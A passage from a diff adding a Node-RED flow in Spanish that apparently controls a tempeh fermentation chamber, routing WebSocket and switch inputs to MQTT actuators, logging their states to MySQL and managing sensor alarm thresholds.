+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "a42fb56faf74e319",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "msg.estado = (msg.payload && msg.payload.state) ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Calefacción\"; // O el actuador correspondiente\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1660,
+        "wires": [
+            [
+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "c88be41ff3bbe202",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "msg.estado = (msg.payload && msg.payload.state) ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Aire Frió\"; // O el actuador correspondiente\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1540,
+        "wires": [
+            [
+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "bc2e401b348b9954",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Guardar registro de actividad en BD",
+        "func": "// Obtener fecha y hora actual en formato MySQL\nconst fechaHoy = new Date();\nconst año = fechaHoy.getFullYear();\nconst mes = String(fechaHoy.getMonth() + 1).padStart(2, '0');\nconst dia = String(fechaHoy.getDate()).padStart(2, '0');\nconst horas = String(fechaHoy.getHours()).padStart(2, '0');\nconst minutos = String(fechaHoy.getMinutes()).padStart(2, '0');\nconst segundos = String(fechaHoy.getSeconds()).padStart(2, '0');\nconst fechaHoraFormateada = `${año}-${mes}-${dia} ${horas}:${minutos}:${segundos}`;\n\n// Recuperar el ID del registro actual desde el contexto global\nconst idRegistro = global.get(\"ID_Registro_Actual\");\n\nif (!idRegistro) {\n    node.error(\"No se encontró ID_Registro_Actual en el contexto global\");\n    return null;\n}\n\n// Construir la consulta SQL con ID_Registro\nvar query = `INSERT INTO Actuador (Fecha_Registro, Estado, Tipo_Actuador, ID_Registro) \n             VALUES (\"${fechaHoraFormateada}\", \"${msg.estado}\", \"${msg.tipoActuador}\", ${idRegistro});`;\n\nmsg.topic = query;\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1400,
+        "y": 1440,
+        "wires": [
+            [
+                "c61c7193ce269b38"
+            ]
+        ]
+    },
+    {
+        "id": "262de9fb64d305b7",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/ventilador",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 910,
+        "y": 1260,
+        "wires": []
+    },
+    {
+        "id": "f9ab28c82f785ef3",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/calefaccion",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 910,
+        "y": 1600,
+        "wires": []
+    },
+    {
+        "id": "2824033e0f20d448",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/aireFrio",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 900,
+        "y": 1480,
+        "wires": []
+    },
+    {
+        "id": "a6317bc05ff586b2",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/luzCam",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 900,
+        "y": 1140,
+        "wires": []
+    },
+    {
+        "id": "feb56fcca0148fc0",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/ventilador2",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 910,
+        "y": 1360,
+        "wires": []
+    },
+    {
+        "id": "c8926ea75728cc59",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "msg.estado = (msg.payload && msg.payload.state) ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Ventilador2\"; // O el actuador correspondiente\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1420,
+        "wires": [
+            [
+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "36be3b2d6c160fbb",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "if (msg.payload === true) {\n    msg.estado = \"encendido\";\n} else {\n    msg.estado = \"apagado\";\n}\nmsg.tipoActuador = \"LuzCam\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1200,
+        "wires": [
+            [
+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "aec717e0ed467170",
+        "type": "mqtt out",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "topic": "tempeh/humidificador",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "e9302dc59ed18e5d",
+        "x": 920,
+        "y": 1700,
+        "wires": []
+    },
+    {
+        "id": "657f811538f97143",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "msg.estado = (msg.payload && msg.payload.state) ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Humidificador\"; // O el actuador correspondiente\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1760,
+        "wires": [
+            [
+                "bc2e401b348b9954"
+            ]
+        ]
+    },
+    {
+        "id": "d412c3f80c75edde",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "WS IN Ventilador 1",
+        "server": "5942395036d16521",
+        "client": "",
+        "x": 130,
+        "y": 1260,
+        "wires": [
+            [
+                "ede57da94f62897c"
+            ]
+        ]
+    },
+    {
+        "id": "d27b22e8fae78810",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "WS IN Ventilador 2",
+        "server": "b17c2d5db60310be",
+        "client": "",
+        "x": 130,
+        "y": 1380,
+        "wires": [
+            [
+                "7b1f6e28026cb37e"
+            ]
+        ]
+    },
+    {
+        "id": "0d19c6b25113dfb8",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "WS IN Aire Frio",
+        "server": "e6b2e1324cf1c43b",
+        "client": "",
+        "x": 120,
+        "y": 1480,
+        "wires": [
+            [
+                "c52648f3c7cdc78f"
+            ]
+        ]
+    },
+    {
+        "id": "d3c451af9e03d2c9",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "WS IN Calefacción",
+        "server": "2bbc54d0a8edb50e",
+        "client": "",
+        "x": 130,
+        "y": 1600,
+        "wires": [
+            [
+                "bbd68721e57bd083"
+            ]
+        ]
+    },
+    {
+        "id": "f04858843a23e490",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "WS IN Humidificador",
+        "server": "b063a8baa9bbaf13",
+        "client": "",
+        "x": 130,
+        "y": 1700,
+        "wires": [
+            [
+                "c6250c559718f47a"
+            ]
+        ]
+    },
+    {
+        "id": "c61c7193ce269b38",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Verificar Proceso Activo o Pausado",
+        "func": "let activo = global.get(\"Proceso_Activo\");\n\nif (activo === true) {\n    return msg;\n} else {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso inactivo, no guardo datos\" });\n    return null;\n}\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1720,
+        "y": 1440,
+        "wires": [
+            [
+                "f2d74c2e9f4ad884"
+            ]
+        ]
+    },
+    {
+        "id": "f2d74c2e9f4ad884",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 1950,
+        "y": 1440,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "af2e1ed43c59d2fd",
+        "type": "ui_switch",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "label": "Activar LUZ CAMARA",
+        "tooltip": "",
+        "group": "866a2a2bcefaf27b",
+        "order": 10,
+        "width": 4,
+        "height": 1,
+        "passthru": true,
+        "decouple": "false",
+        "topic": "topic",
+        "topicType": "msg",
+        "style": "",
+        "onvalue": "true",
+        "onvalueType": "bool",
+        "onicon": "",
+        "oncolor": "",
+        "offvalue": "false",
+        "offvalueType": "bool",
+        "officon": "",
+        "offcolor": "",
+        "animate": false,
+        "className": "",
+        "x": 400,
+        "y": 1140,
+        "wires": [
+            [
+                "a6317bc05ff586b2",
+                "36be3b2d6c160fbb"
+            ]
+        ]
+    },
+    {
+        "id": "ed0556b99708c233",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Procesar Estado Ventilador 1",
+        "func": "const estadoBool = msg.payload && typeof msg.payload.state === 'boolean' ? msg.payload.state : false;\n\nmsg.estado = estadoBool ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Ventilador1\";  // Cambiar según actuador\n\n// MQTT espera { state: true } o { state: false }\nmsg.payload = { state: estadoBool };\n\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 580,
+        "y": 1260,
+        "wires": [
+            [
+                "262de9fb64d305b7",
+                "285f2f5547179b76"
+            ]
+        ]
+    },
+    {
+        "id": "9ca8c02911dc9008",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Procesar Estado Calefacción",
+        "func": "const estadoBool = msg.payload && typeof msg.payload.state === 'boolean' ? msg.payload.state : false;\n\nmsg.estado = estadoBool ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Calefacción\";  // Cambiar según actuador\n\n// MQTT espera { state: true } o { state: false }\nmsg.payload = { state: estadoBool };\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 580,
+        "y": 1600,
+        "wires": [
+            [
+                "f9ab28c82f785ef3",
+                "a42fb56faf74e319"
+            ]
+        ]
+    },
+    {
+        "id": "0474578d1f95563f",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Procesar Estado Aire Frio",
+        "func": "const estadoBool = msg.payload && typeof msg.payload.state === 'boolean' ? msg.payload.state : false;\n\nmsg.estado = estadoBool ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Aire Frío\";  // Cambiar según actuador\n\n// MQTT espera { state: true } o { state: false }\nmsg.payload = { state: estadoBool };\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 570,
+        "y": 1480,
+        "wires": [
+            [
+                "2824033e0f20d448",
+                "c88be41ff3bbe202"
+            ]
+        ]
+    },
+    {
+        "id": "71ccd4092de49a0c",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Procesar Estado Ventilador 2",
+        "func": "const estadoBool = msg.payload && typeof msg.payload.state === 'boolean' ? msg.payload.state : false;\n\nmsg.estado = estadoBool ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Ventilador2\";  // Cambiar según actuador\n\n// MQTT espera { state: true } o { state: false }\nmsg.payload = { state: estadoBool };\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 580,
+        "y": 1380,
+        "wires": [
+            [
+                "feb56fcca0148fc0",
+                "c8926ea75728cc59"
+            ]
+        ]
+    },
+    {
+        "id": "97742ac577f141a2",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Procesar Estado Humidificador",
+        "func": "const estadoBool = msg.payload && typeof msg.payload.state === 'boolean' ? msg.payload.state : false;\n\nmsg.estado = estadoBool ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Humidificador\";  // Cambiar según actuador\n\n// MQTT espera { state: true } o { state: false }\nmsg.payload = { state: estadoBool };\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 590,
+        "y": 1700,
+        "wires": [
+            [
+                "aec717e0ed467170",
+                "657f811538f97143"
+            ]
+        ]
+    },
+    {
+        "id": "ede57da94f62897c",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 350,
+        "y": 1260,
+        "wires": [
+            [
+                "ed0556b99708c233"
+            ]
+        ]
+    },
+    {
+        "id": "bbd68721e57bd083",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 350,
+        "y": 1600,
+        "wires": [
+            [
+                "9ca8c02911dc9008"
+            ]
+        ]
+    },
+    {
+        "id": "c52648f3c7cdc78f",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 350,
+        "y": 1480,
+        "wires": [
+            [
+                "0474578d1f95563f"
+            ]
+        ]
+    },
+    {
+        "id": "7b1f6e28026cb37e",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 350,
+        "y": 1380,
+        "wires": [
+            [
+                "71ccd4092de49a0c"
+            ]
+        ]
+    },
+    {
+        "id": "c6250c559718f47a",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 350,
+        "y": 1700,
+        "wires": [
+            [
+                "97742ac577f141a2"
+            ]
+        ]
+    },
+    {
+        "id": "9cb3b070c950e2ba",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "2fb643469648ab0d",
+        "name": "Guardar parametros fase 1",
+        "func": "// Obtiene los parámetros desde msg.humidityParams\nvar params = msg.params;\n\nvar currentDate = new Date().toISOString().slice(0, 19).replace('T', ' '); // Formato 'YYYY-MM-DD HH:MM:SS'\n\n// Prepara la consulta SQL\nmsg.topic = \"INSERT INTO parametros_alarmas (Tipo_Sensor, Limite_Min, Limite_Max, Fecha_Actualizacion, Ubicacion) VALUES (?, ?, ?, ?, ?)\";\nmsg.payload = [params.tipo + \" - Fase 1\", params.paramMin, params.paramMax, currentDate, \"UTN\"]; // Datos a insertar\n\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3600,
+        "y": 160,
+        "wires": [
+            [
+                "7a75839e7e24b2ca"
+            ]
+        ]
+    },
+    {
+        "id": "084c4a28669c7c83",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "2fb643469648ab0d",
+        "name": "Guardar parametros fase 2",
+        "func": "// Obtiene los parámetros desde msg.humidityParams\nvar params = msg.params;\n\nvar currentDate = new Date().toISOString().slice(0, 19).replace('T', ' '); // Formato 'YYYY-MM-DD HH:MM:SS'\n\nmsg.topic = \"INSERT INTO parametros_alarmas (Tipo_Sensor, Limite_Min, Limite_Max, Fecha_Actualizacion, Ubicacion) VALUES (?, ?, ?, ?, ?)\";\nmsg.payload = [params.tipo + \" - Fase 2\", params.paramMin2, params.paramMax2, currentDate, \"UTN\"]; // Datos a insertar\n\n\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3600,
+        "y": 240,
+        "wires": [
+            [
+                "7a75839e7e24b2ca"
+            ]
+        ]
+    },
+    {
+        "id": "5221b6b1b60393ea",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "42e72904bc236b7d",
+        "name": "Setea parametros Temperatura Ambiente",
+        "func": "// Asumimos que recibes los valores en msg.payload (desde el formulario de temperatura)\nvar tempMinF1 = msg.payload.tempMinF1;  // Límite mínimo de temperatura\nvar tempMaxF1 = msg.payload.tempMaxF1;  // Límite máximo de temperatura\nvar tempMinF2 = msg.payload.tempMinF2;\nvar tempMaxF2 = msg.payload.tempMaxF2;\n\n// Guarda los límites globalmente (o en el contexto de flujo)\nflow.set(\"tempMinF1\", tempMinF1);\nflow.set(\"tempMaxF1\", tempMaxF1);\nflow.set(\"tempMinF2\", tempMinF2);\nflow.set(\"tempMaxF2\", tempMaxF2);\nmsg.params = {\n    tipo: \"Temperatura Ambiente\",\n    paramMin: tempMinF1,\n    paramMax: tempMaxF1,\n    paramMin2: tempMinF2,\n    paramMax2: tempMaxF2\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3160,
+        "y": 360,
+        "wires": [
+            [
+                "9cb3b070c950e2ba",
+                "084c4a28669c7c83"
+            ]
+        ]
+    },
+    {
+        "id": "a40b3a8136096cae",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "42e72904bc236b7d",
+        "name": "WS In TempAmbiente",
+        "server": "961298ba6ab6e1d0",
+        "client": "",
+        "x": 2720,
+        "y": 360,
+        "wires": [
+            [
+                "5f814e05cba4b4c2"
+            ]
+        ]
+    },
+    {
+        "id": "5f814e05cba4b4c2",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "42e72904bc236b7d",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 2890,
+        "y": 360,
+        "wires": [
+            [
+                "5221b6b1b60393ea"
+            ]
+        ]
+    },
+    {
+        "id": "062888e53858ac6c",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "a788b397b1633ff0",
+        "name": "Setea parametros Humedad",
+        "func": "// Recibe los valores desde el formulario en msg.payload\nvar humMin = msg.payload.humidityMin;  // Límite mínimo de humedad\nvar humMax = msg.payload.humidityMax;  // Límite máximo de humedad\nvar humMin12hs = msg.payload.humidityMin12hs;\nvar humMax12hs = msg.payload.humidityMax12hs;\n\n// Guarda los límites globalmente en el contexto de flujo\nflow.set(\"humMin\", humMin);\nflow.set(\"humMax\", humMax);\nflow.set(\"humMin12hs\", humMin12hs);\nflow.set(\"humMax12hs\", humMax12hs);\n\n// Prepara los datos para el nodo de inserción\nmsg.params = {\n    tipo: \"Humedad\",\n    paramMin: humMin,\n    paramMax: humMax,\n    paramMin2: humMin12hs,\n    paramMax2: humMax12hs\n};\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3140,
+        "y": 60,
+        "wires": [
+            [
+                "9cb3b070c950e2ba",
+                "084c4a28669c7c83"
+            ]
+        ]
+    },
+    {
+        "id": "e98478a36d9fdb13",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "a788b397b1633ff0",
+        "name": "WS In Humedad",
+        "server": "3beea0692773a3b6",
+        "client": "",
+        "x": 2700,
+        "y": 60,
+        "wires": [
+            [
+                "d30ae282db20f44b"
+            ]
+        ]
+    },
+    {
+        "id": "d30ae282db20f44b",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "a788b397b1633ff0",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 2870,
+        "y": 60,
+        "wires": [
+            [
+                "062888e53858ac6c"
+            ]
+        ]
+    },
+    {
+        "id": "85f47c81d7567108",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "81115cc2d92860c3",
+        "name": "Setea parametros CO2",
+        "func": "// Asumimos que recibes los valores en msg.payload (desde el formulario de CO₂)\nvar co2Min = msg.payload.co2Min;  // Límite mínimo de CO₂\nvar co2Max = msg.payload.co2Max;  // Límite máximo de CO₂\nvar co2Min12hs = msg.payload.co2Min12hs;  // Límite máximo de CO₂\nvar co2Max12hs = msg.payload.co2Max12hs;  // Límite máximo de CO₂\n\n// Guarda los límites globalmente (o en el contexto de flujo)\nflow.set(\"co2Min\", co2Min);\nflow.set(\"co2Max\", co2Max);\nflow.set(\"co2Min12hs\", co2Min12hs);\nflow.set(\"co2Max12hs\", co2Max12hs);\n\nmsg.params = {\n    tipo: \"CO2\",\n    paramMin: co2Min,\n    paramMax: co2Max,\n    paramMin2: co2Min12hs,\n    paramMax2: co2Max12hs\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3070,
+        "y": 160,
+        "wires": [
+            [
+                "9cb3b070c950e2ba",
+                "084c4a28669c7c83"
+            ]
+        ]
+    },
+    {
+        "id": "9665f410e798b112",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "81115cc2d92860c3",
+        "name": "WS In Calidad Aire",
+        "server": "1b77a9c030956226",
+        "client": "",
+        "x": 2710,
+        "y": 160,
+        "wires": [
+            [
+                "1a89c75b20c85ace"
+            ]
+        ]
+    },
+    {
+        "id": "1a89c75b20c85ace",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "81115cc2d92860c3",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 2870,
+        "y": 160,
+        "wires": [
+            [
+                "85f47c81d7567108"
+            ]
+        ]
+    },
+    {
+        "id": "f9c93eebbe94232f",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "05055b15566ae5fd",
+        "name": "Setea parametros temp sonda",
+        "func": "// Asumimos que recibes los valores en msg.payload (desde el formulario de humedad)\nvar tempProduMin = msg.payload.tempProduMin;  // Límite mínimo de humedad\nvar tempProduMax = msg.payload.tempProduMax;  // Límite máximo de humedad\nvar tempProduMin12hs = msg.payload.tempProduMin12hs;\nvar tempProduMax12hs = msg.payload.tempProduMax12hs;\n\n// Guarda los límites globalmente (o en el contexto de flujo)\nflow.set(\"tempProduMin\", tempProduMin);\nflow.set(\"tempProduMax\", tempProduMax);\nflow.set(\"tempProduMin12hs\", tempProduMin12hs);\nflow.set(\"tempProduMax12hs\", tempProduMax12hs);\n\nmsg.params = {\n    tipo: \"Temperatura Sonda\",\n    paramMin: tempProduMin,\n    paramMax: tempProduMax,\n    paramMin2: tempProduMin12hs,\n    paramMax2: tempProduMax12hs\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3110,
+        "y": 260,
+        "wires": [
+            [
+                "9cb3b070c950e2ba",
+                "084c4a28669c7c83"
+            ]
+        ]
+    },
+    {
+        "id": "5c95b426c7384bd7",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "05055b15566ae5fd",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 2870,
+        "y": 260,
+        "wires": [
+            [
+                "f9c93eebbe94232f"
+            ]
+        ]
+    },
+    {
+        "id": "6773a73d2fe8585c",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "05055b15566ae5fd",
+        "name": "WS In TempSonda",
+        "server": "e03c10eb526d0e5b",
+        "client": "",
+        "x": 2710,
+        "y": 260,
+        "wires": [
+            [
+                "5c95b426c7384bd7"
+            ]
+        ]
+    },
+    {
+        "id": "7a75839e7e24b2ca",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "2fb643469648ab0d",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3870,
+        "y": 200,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "7542220330bcd432",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3490,
+        "y": 480,
+        "wires": [
+            [
+                "ecefde7caf50b685"
+            ]
+        ]
+    },
+    {
+        "id": "b2d342a8f67d0394",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Temperatura Ambiente Fase 1",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Temperatura Ambiente - Fase 1' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 1\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3180,
+        "y": 460,
+        "wires": [
+            [
+                "7542220330bcd432"
+            ]
+        ]
+    },
+    {
+        "id": "4c925639fbe5719f",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Traer Parametros Temperatura Ambiente Fase 2",
+        "func": "msg.topic = \"SELECT Limite_Min, Limite_Max FROM parametros_alarmas WHERE Tipo_Sensor = 'Temperatura Ambiente - Fase 2' ORDER BY Fecha_Actualizacion DESC LIMIT 1\";\nmsg.fase = \"Fase 2\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3180,
+        "y": 500,
+        "wires": [
+            [
+                "7542220330bcd432"
+            ]
+        ]
+    },
+    {
+        "id": "ecefde7caf50b685",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Setear Parametros Temperatura Ambiente",
+        "func": "if (!msg.payload || !msg.payload[0]) {\n    node.error(\"No se recibieron límites desde la base de datos\");\n    return null;\n}\n\nconst min = msg.payload[0].Limite_Min;\nconst max = msg.payload[0].Limite_Max;\n\nif (msg.fase === \"Fase 1\") {\n    global.set(\"tempAmb_min_f1\", min);\n    global.set(\"tempAmb_max_f1\", max);\n} else if (msg.fase === \"Fase 2\") {\n    global.set(\"tempAmb_min_f2\", min);\n    global.set(\"tempAmb_max_f2\", max);\n}\n\n// Mostrar por debajo del nodo\nnode.status({\n    fill: \"green\",\n    shape: \"dot\",\n    text: `Límites ${msg.fase}: Min ${min} - Max ${max}`\n});\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3760,
+        "y": 480,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "a0219bd8d92a41c5",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "g": "c99cd395087dcd62",
+        "name": "Cronometro Consulta de Parametros",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "20",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 2790,
+        "y": 600,
+        "wires": [
+            [
+                "b2d342a8f67d0394",
+                "4c925639fbe5719f",
+                "6e53103644bb73ae",
+                "d4c7da80c5baceda",
+                "93e2a214272ae291",
+                "ea22e8aae9ef4062",
+                "0c07726808bad07a",
